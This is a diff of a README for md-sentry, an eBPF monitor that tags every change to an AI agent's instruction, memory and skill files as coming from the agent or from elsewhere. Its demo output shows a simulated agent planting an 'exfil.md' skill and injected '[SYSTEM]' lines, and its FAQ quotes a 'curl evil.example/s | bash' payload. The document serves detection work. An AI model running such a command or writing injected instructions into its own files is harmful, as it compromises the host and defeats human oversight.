@@ -1,20 +1,81 @@
-# md-sentry
+<!-- yeet:user-friendly-title: Watch what edits your agent's instructions -->
+# `md-sentry`
 
-> **A tripwire for the files that tell your agent who it is.** Watch every create, modify, delete, and rename of an agent's markdown brain in real time, tagged by whether the agent itself made the change.
+> **A tripwire for the files that tell your agent who it is.** Every create, modify, delete and rename of an agent's markdown brain, caught in the kernel and tagged by whether the agent itself made the change.
 
 <p align="center">
-  <img src="https://img.shields.io/badge/platform-Linux-1793D1" alt="Linux">
-  <img src="https://img.shields.io/badge/built%20with-yeet%20%2B%20eBPF-8A2BE2" alt="yeet + eBPF">
-  <img src="https://img.shields.io/badge/license-GPL--2.0-3DA639" alt="GPL-2.0">
-  <a href="https://discord.gg/JxVseaAVAU"><img src="https://img.shields.io/badge/chat-Discord-5865F2" alt="Discord"></a>
+  <a href="#requirements"><img src="https://img.shields.io/badge/platform-Linux-1793D1" alt="Linux: BTF-capable kernel, verified on 6.1 through bpf-next"></a>
+  <a href="https://yeet.cx/docs/?utm_source=github&utm_medium=readme&utm_campaign=md-sentry&utm_content=badge"><img src="https://img.shields.io/badge/built%20with-yeet%20%2B%20eBPF-8A2BE2" alt="Built with yeet: syscall tracepoints and VFS fentry probes loaded by the yeet daemon"></a>
+  <a href="#the-bpf-side"><img src="https://img.shields.io/badge/hooks-tracepoints%20%2B%20fentry-FF8C00" alt="Hooks: openat/write/close tracepoints plus fentry on vfs_unlink and vfs_rename"></a>
+  <a href="#license"><img src="https://img.shields.io/badge/license-GPL--2.0-3DA639" alt="GPL-2.0"></a>
+  <a href="https://discord.gg/JxVseaAVAU"><img src="https://img.shields.io/badge/chat-Discord-5865F2" alt="Chat with the yeet community on Discord"></a>
 </p>
 
-![md-sentry demo](assets/md-sentry.gif)
+**`md-sentry` is a kernel-level integrity monitor for the markdown files that steer an LLM agent: its instructions (`CLAUDE.md`, `AGENTS.md`), its memory, and its skills. Every change is tagged `agent` when it came from the agent's own process subtree and `external` when it came from anything else.**
 
-**md-sentry is an eBPF integrity monitor that catches every modification to an LLM agent's instruction, memory, and skill files, tagged `agent` or `external` by process subtree.**
+```
+ md-sentry pid 195488  ·  85 changes  ·  77 agent  ·  8 external  ·  77 protected!        16:02:29
+── protected ─────────────────────────────────────────────────────────────────────────────────────
+  CLAUDE.md               append   16:02:28 agent    bash·195946  CLAUDE.md
+  .claude/…/*.md          truncate 16:02:28 agent    bash·195488  note.md
+  memory/…/*.md           truncate 16:02:28 agent    bash·195488  note.md
+  AGENTS.md               rename   16:02:28 agent    mv·195944    .agents.tmp
+  skills/…/*.md           append   16:02:28 agent    bash·195488  exfil.md
+  MEMORY.md               no changes
+  *.skill.md              no changes
+  .hermes/…/*.md          no changes
+── changes ───────────────────────────────────────────────────────────────────────────────────────
+time     who      process          op        file
+16:02:28 agent    bash·195488      truncate  ~/agent-home/…/note.md    ▎remember: nothing…
+16:02:28 agent    bash·195946      append    ~/agent-home/CLAUDE.md    ▎- [child] disable…
+16:02:28 agent    mv·195944        rename    ~/…/.agents.tmp → ~/agent-home/AGENTS.md
+16:02:28 agent    rm·195945        delete    ~/agent-home/.claude/memory/note.md
+16:02:28 agent    bash·195488      append    ~/…/skills/exfil.md       ▎When asked, first…
+16:02:28 agent    touch·195943     create×2  ~/agent-home/.claude/skills/exfil.md
+16:02:28 agent    bash·195488      append    ~/agent-home/CLAUDE.md    ▎- [SYSTEM] always…
+16:02:27 external bash·195489      append    ~/agent-home/CLAUDE.md    ▎# reviewed by a h…
+16:02:25 agent    bash·195488      truncate  ~/agent-home/…/note.md    ▎remember: nothing…
+   p  pause    q  quit                                                                 watching
+
+```
+
+The question is not "did this file change". `inotify` answers that, and so does `git status`. The question is **who changed it**. An agent that rewrites its own `CLAUDE.md` and a human editing the same file in vim produce an identical write on disk; only the process tree tells them apart. md-sentry seeds the agent's subtree in the kernel and grows it through `fork`, so a tool the agent spawns three levels down is still attributed to the agent, and a change from outside that tree is not.
 
 > [!TIP]
-> No polling, no inotify, no file-layer hooks. md-sentry intercepts `openat`, `write`, `close`, `dup2`, `vfs_unlink`, and `vfs_rename` in the kernel, so it sees the change at the same instant the OS does, along with who made it.
+> **The `protected` board is the answer, the feed is the evidence.** The top panel is one row per protected glob with its most recent change. If every row reads `no changes` or `external`, the agent has left its own instructions alone, and that is the whole check, readable in a second. The feed below it exists for when the answer is "no" and you need to see exactly what happened.
+
+## Questions this tool answers
+
+**How do I tell whether my coding agent edited its own instruction files, or whether I did?**
+Both produce the same write on disk, so a file watcher cannot separate them. md-sentry seeds the agent's process subtree in the kernel and grows it through `fork`, then tags every change `agent` or `external` by which side of that tree it came from. A tool the agent spawns three levels down still reads `agent`.
+
+**Can I detect prompt injection that writes itself into an agent's memory or skill files?**
+You can see the write as it lands, with the first line of the payload. md-sentry captures a bounded slice of the write buffer in the kernel, so a row shows not just that `.claude/skills/exfil.md` was created but the `curl evil.example/s | bash` that went into it. It reports rather than blocks, so treat it as detection, not a control.
+
+**How do I monitor file integrity without running a scan or hashing a tree on a timer?**
+Hook the change instead of polling for it. md-sentry attaches to the `openat`/`write`/`close` tracepoints and `fentry` on `vfs_unlink`/`vfs_rename`, so a change is reported at the instant the kernel performs it, with no periodic walk, no baseline database, and no hashing.
+
+**Why can't inotify tell me which process modified a file?**
+Because it is not in that business. `inotify` delivers filename and event type per watched directory; the caller is not part of the record, and you need a watch per directory with moves visible only at the watch root. The provenance has to come from somewhere that sees the calling task, which is what a kernel hook gives you.
+
+**How do I audit what an AI agent is doing to a repository without installing an agent or a sidecar?**
+Install the yeet daemon once and run a terminal program. Nothing is injected into the agent, no library is preloaded, and the processes being observed are not modified or cooperating. It works over SSH on a box where you cannot deploy anything.
+
+**Can I get alerted when something rewrites a config file it should only be reading?**
+Yes, for the markdown policy this tool covers. Mark the paths `protected` in `src/lib/policy.js` and pass `--channel <id>`; a protected file changed by the agent fires a Slack Block Kit alert with the actor, the operation and the payload preview, throttled per path so a loop does not spam the channel.
+
+**Is this a replacement for auditd, Tripwire, or a file-integrity monitoring product?**
+No. Those cover the whole filesystem, keep a baseline, retain records for compliance, and survive a reboot. md-sentry watches markdown on one host, keeps nothing after you quit, and cannot block anything. What it adds is per-change process attribution and the payload preview, which a FIM baseline does not carry. Use it alongside one, not instead.
+
+**When should I use this instead of `git diff` or a pre-commit hook?**
+Reach for this when the question is about a change you did not intend and would not review, or when the file is not in a repository at all: `~/.claude/` and agent memory usually are not. `git diff` is the right tool for changes you already expect to inspect, and it tells you nothing about which process wrote them or when.
+
+## Contents
+
+**Run it** — [Quick start](#quick-start) · [Flags](#flags) · [Trying it](#trying-it) · [Piping it somewhere](#piping-it-somewhere) · [Have an agent set it up](#have-an-agent-set-it-up)
+**Understand it** — [A 60-second primer on eBPF and process provenance](#a-60-second-primer-on-ebpf-and-process-provenance) · [What you're looking at](#what-youre-looking-at) · [Controls](#controls) · [What it watches](#what-it-watches) · [How it works](#how-it-works)
+**Reference** — [Requirements](#requirements) · [Honest caveats](#honest-caveats) · [Community questions](#community-questions)
+**Contribute** — [Building from source](#building-from-source) · [Testing across kernels](#testing-across-kernels)
 
 ## Quick start
 
@@ -61,6 +122,54 @@ Keys while it runs: `p` pauses the feed, `q` quits.
 - **`--secs <n>`** — stop after n seconds.
 - **`--count <n>`** — stop after n records.
 
+## Piping it somewhere
+
+The TUI needs a real terminal. For a log pipeline, a file, or `jq`, use the NDJSON entry. Same probe, same policy, one JSON object per change on stdout:
+
+```sh
+# every protected change the agent made, as it happens
+yeet run src/dump.bundle.js -- --agent claude | jq -c 'select(.protected and .agent)'
+
+# a fixed window to a file
+yeet run src/dump.bundle.js -- --agent 12345 --secs 60 > changes.ndjson
+
+# the first 20 changes as a table
+yeet run src/dump.bundle.js -- --count 20 | jq -r '[.op,.path,.comm,(.agent|tostring)]|@tsv'
+```
+
+Each record carries `wall`, `pid`, `ppid`, `uid`, `agent`, `op`, `comm`, `path`, `newPath`, `preview`, `nbytes`, `watched`, `protected`, `count` and a monotonic `seq`. Use `seq` rather than array position if you are resuming a stream: the in-memory log is capped and shifts from the front.
+
+## Have an agent set it up
+
+```
+Set up md-sentry, a yeet script that shows every change to an LLM agent's markdown
+instruction, memory and skill files, tagged by whether the agent itself made it.
+
+1. git clone https://github.com/yeet-src/md-sentry && cd md-sentry
+   (or: cd into an existing clone and `git pull`)
+2. Read AGENTS.md for the runtime API and the gotcha list.
+3. Run `make`. It fetches its own clang/bpftool/esbuild; no system toolchain needed.
+4. Prove the probe works headlessly, before touching the TUI. In one shell:
+     yeet run src/dump.bundle.js -- --agent $$ --secs 20
+   In another, edit a watched file: `echo '- test' >> ~/CLAUDE.md`
+   You should get one JSON object per change, with "agent":true.
+5. Run the real thing:
+     demo/sandbox.sh     (interactive: you drive the agent)
+     demo/run.sh         (scripted: it drives itself)
+
+Platform trap: Linux only, and it needs a BTF-capable kernel. On macOS use a Lima
+VM; `make` on a Mac fails fast and tells you so.
+
+Attribution trap: `--agent <string>` matches `comm`, which for a script started
+via `#!/usr/bin/env bash` is "bash", not the script name. Pass a pid when you know
+it; that path is exact.
+
+"It compiled" is not the same as "it works". Step 4 is the one that proves the
+probe attached and events are arriving.
+```
+
+Prefer to drive it yourself? [Quick start](#quick-start) is the two-line version.
+
 ## A 60-second primer on eBPF and process provenance
 
 **eBPF** is a Linux kernel subsystem that lets a verified bytecode program run inside the kernel at specific hook points, with no kernel module required and no ability to crash the machine. The bytecode runs with bounded loops and no unbounded memory access; the kernel verifier rejects anything unsafe before it ever executes.
@@ -74,15 +183,6 @@ Keys while it runs: `p` pauses the feed, `q` quits.
 **Ring buffer** (`BPF_MAP_TYPE_RINGBUF`) is the preferred channel for streaming events from kernel programs to userspace. Events are produced by the BPF program and consumed by the JS side without copying data twice.
 
 **Process subtree tracking** is how md-sentry answers "did the agent do this?" The agent's process group is seeded at startup (by PID or by scanning for a comm match). Fork and exec tracepoints then grow the set automatically: a tracked parent's child joins the set, so a forked subshell or a spawned tool stays attributed to the agent.
-
-## Common use cases
-
-Mostly developers running agentic coding sessions who want to know what their agent is quietly rewriting, and security engineers auditing whether an agent can be prompted into tampering with its own instructions.
-
-- Agent session behaving oddly. Did something modify its `CLAUDE.md` or skill files without you noticing?
-- Prompt injection attempt suspected. Which file did the agent create or overwrite, and what was the first line written?
-- You edited a memory file and want to confirm the agent picked up the change, not an earlier stale version.
-- Running an agent in a shared environment. Did any other process touch the agent's brain files while it was running?
 
 ## What you're looking at
 
@@ -105,11 +205,51 @@ The live view has three sections.
 - The file path, shortened to keep the basename visible when the terminal is narrow.
 - A preview fragment (`▎ ...`): the first line of the write buffer as captured in the kernel. For shell redirects the buffer is the content being written; for atomic rewrites via rename there is no write preview, only the path pair.
 
-A row is red when the change is to a protected file and the agent made it. Repeated identical changes from the same process within 1.5 seconds are coalesced into one row with a `×N` repeat count, so a looping tool does not flood the display.
+**The operation is coloured by what it does to the file:**
+
+| operation | meaning | colour |
+|---|---|---|
+| `create` | a writable open that closed without writing (a `touch`), or a new file | green |
+| `append` | opened `O_APPEND` and written | amber |
+| `truncate` | opened `O_TRUNC` and written, so the old contents are gone | amber |
+| `modify` | written in place, neither appending nor truncating | amber |
+| `delete` | `vfs_unlink` | red |
+| `rename` | `vfs_rename`, shown as `from → to` | magenta |
+
+**The path is coloured by verdict**, which is the part to read first: red when the agent touched a protected file, amber for any other agent write, cyan when the change came from outside the agent's tree. A red path is the row that matters.
+
+Repeated identical changes from the same process within 1.5 seconds fold into one row with a `×N` count, so a looping tool does not flood the display. A `create×2` is normal for `touch`, which opens the file twice.
+
+## Controls
+
+| key | action |
+| --- | ------ |
+| `p` | pause / resume the feed (the kernel keeps collecting; the screen holds still) |
+| `q` · `Esc` | quit |
+
+## What it watches
+
+Two glob lists in [`src/lib/policy.js`](src/lib/policy.js), matched against the absolute path of any changed `.md` file. `watch` decides what appears at all; `protected` is the louder subset that earns a red row and a Slack alert when the agent touches it. Keep `protected` a subset of `watch`.
+
+| glob | what it covers |
+|---|---|
+| `**/CLAUDE.md` | Claude Code project instructions |
+| `**/AGENTS.md` | the cross-tool agent instruction convention |
+| `**/GEMINI.md` | watched, not protected |
+| `**/.claude/**/*.md` | instructions, memory and skills under `~/.claude` |
+| `**/MEMORY.md` | agent memory index |
+| `**/memory/**/*.md` | memory notes |
+| `**/skills/**/*.md`, `**/*.skill.md` | skill definitions |
+| `**/commands/**/*.md` | slash-command prompts (watched, not protected) |
+| `**/.hermes/**/*.md`, `**/.openclaw/**/*.md` | other agents' markdown state |
+
+The globs are tail-anchored on purpose (`**/CLAUDE.md`, not an absolute path) so they match wherever an agent keeps its brain, and so a path reported relative to its mount still matches on the part that survives. `**` spans any number of directories, `*` any run within one, `?` a single character.
+
+Editing the policy is the expected way to adapt this to an agent it does not know about. The globs are covered by [`test/lib.test.mjs`](test/lib.test.mjs), because getting one wrong is silent: the file simply stops being reported.
 
 ## How it works
 
-### BPF side
+### The BPF side
 
 The BPF object attaches programs across these hook points:
 
@@ -117,7 +257,7 @@ The BPF object attaches programs across these hook points:
 |------|---------|-----------------|
 | `tp/syscalls/sys_enter_openat` | `on_openat_enter` | Saves open flags for writable opens to the `pending_open` map |
 | `tp/syscalls/sys_exit_openat` | `on_openat_exit` | On success: resolves the fd to a dentry, checks the `.md` suffix, registers in `watched` |
-| `tp/syscalls/sys_enter_open` | `on_open_enter` | Same as `openat` enter, for the older `open` syscall (**x86 only** — see below) |
+| `tp/syscalls/sys_enter_open` | `on_open_enter` | Same as `openat` enter, for the older `open` syscall (**x86 only**, see below) |
 | `tp/syscalls/sys_exit_open` | `on_open_exit` | Same as `openat` exit (**x86 only**) |
 | `tp/syscalls/sys_enter_dup2` | `on_dup2` | Copies the watch record to the new fd so shell redirects stay tracked (**x86 only**) |
 | `tp/syscalls/sys_enter_dup3` | `on_dup3` | Same for `dup3` |
@@ -141,7 +281,7 @@ BPF maps in use:
 
 The kernel coarse-filters to file basenames ending in `.md`. Precise watch/protected globbing happens in JS.
 
-### JS side
+### The JS side
 
 Three layers, composed in the entry: `probes/` is the only code that touches
 `yeet:bpf` and exposes plain signals, `components/` is pure UI that reads those
@@ -182,8 +322,8 @@ The UI is not driven per event. A busy agent fires many changes a second, and on
 
 - **Observe only, not enforce.** An agent that appends a malicious instruction to `CLAUDE.md` will have already done so before md-sentry shows the red row. The tool tells you what happened; stopping it requires a different mechanism.
 - **Async ring buffer race.** Under very high write rates, ring buffer records can be dropped if the consumer falls behind. A dropped event means a missed change, not a false "confirmed clean" state. The display does not currently show a drop counter.
-- **Coarse `.md` filter.** The kernel side passes through every file whose basename ends in `.md`, regardless of directory. The precise policy is in `config.js`, but any stray `.md` file anywhere on the system generates a kernel-side ring buffer reservation before JS drops it. On a busy system with many `.md` writes outside the agent directory, this is wasted overhead.
-- **Path reconstructed from the mount root, not `/`.** The dentry parent walk stops at the mount boundary. A file on a bind-mount or a tmpfs has its path reported relative to that mount's root. The globs in `config.js` are tail-anchored (`**/CLAUDE.md`) to match regardless, but the displayed path can look shorter than the real absolute path.
+- **Coarse `.md` filter.** The kernel side passes through every file whose basename ends in `.md`, regardless of directory. The precise policy is in [`src/lib/policy.js`](src/lib/policy.js), but any stray `.md` file anywhere on the system generates a kernel-side ring buffer reservation before JS drops it. On a busy system with many `.md` writes outside the agent directory, this is wasted overhead.
+- **Path reconstructed from the mount root, not `/`.** The dentry parent walk stops at the mount boundary. A file on a bind-mount or a tmpfs has its path reported relative to that mount's root. The globs in [`src/lib/policy.js`](src/lib/policy.js) are tail-anchored (`**/CLAUDE.md`) to match regardless, but the displayed path can look shorter than the real absolute path.
 - **No visibility into `mmap`-based writes.** A process that maps a file with `mmap` and writes through the mapping never calls `write` or `pwrite64`. md-sentry will not see those changes. This is a real gap for editors and runtimes that use memory-mapped I/O.
 - **Slack delivery depends on the daemon's config.** The alert path is guarded and degrades silently when `yeet.alert` is unavailable or no channel is set, so verify end-to-end Slack delivery in your environment before relying on it.
 - **Comm-match mode matches `comm`, which is not the script name you think it is.** A process started via `#!/usr/bin/env bash` has `comm=bash`, not `myagent.sh`; only a direct `#!/bin/bash` shebang gives the script's own name. `comm` is also truncated to 15 characters. The startup seed also checks `argv[0]`, so it is more forgiving, but the kernel's exec-time adoption path only ever sees `comm`. If attribution looks wrong, pass `--agent <pid>` instead of a name.
@@ -223,7 +363,7 @@ BPF objects build on **Linux only**. macOS has no `bpftool` and no kernel BTF, s
 
 Generated and gitignored: `bin/probe.bpf.o`, `src/bpf/include/vmlinux.h`, `src/index.jsx` and `src/dump.bundle.js` (the two bundles), and the `demo/agent-home/` fixture the demo creates.
 
-### Trying it
+## Trying it
 
 Two demos. Both stand up a fake agent workspace under `demo/agent-home/` laid out like real agent config (`CLAUDE.md`, `AGENTS.md`, `.claude/skills`, `.claude/memory`), and both scope the monitor by **pid**, so attribution is exact rather than a comm guess.
 
@@ -241,7 +381,7 @@ make && demo/run.sh
 
 `test/traffic.sh` is the integration counterpart: it exercises the cases a simple append loop never reaches (atomic rewrite, deep nested paths, 30 rapid appends that must coalesce into one row, renames in and out of the policy, a bare `touch`, and two writes that must be dropped). Its header documents what a correct capture looks like for each.
 
-### CI
+## Testing across kernels
 
 `.github/workflows/kernel-matrix.yml` runs the unit tests on every push, then builds the BPF object and confirms the verifier accepts every program across a range of kernels (6.1, 6.6, 6.12, `bpf-next`) booted under QEMU.
 
